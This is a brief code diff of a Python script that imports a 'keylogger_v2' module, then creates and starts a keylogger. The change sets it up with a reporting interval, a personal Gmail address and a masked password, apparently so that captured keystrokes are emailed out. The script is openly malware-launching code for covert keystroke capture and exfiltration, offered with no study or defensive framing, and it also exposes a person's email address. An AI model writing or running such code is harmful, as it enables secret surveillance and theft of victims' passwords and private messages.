@@ -4,5 +4,6 @@
 
 import keylogger_v2
 
-my_keylogger = keylogger_v2.Keylogger()
+# enter a time interval and email and password to initite this object
+my_keylogger = keylogger_v2.Keylogger(120, "dickkurz77@gmail.com", "********")
 my_keylogger.start()
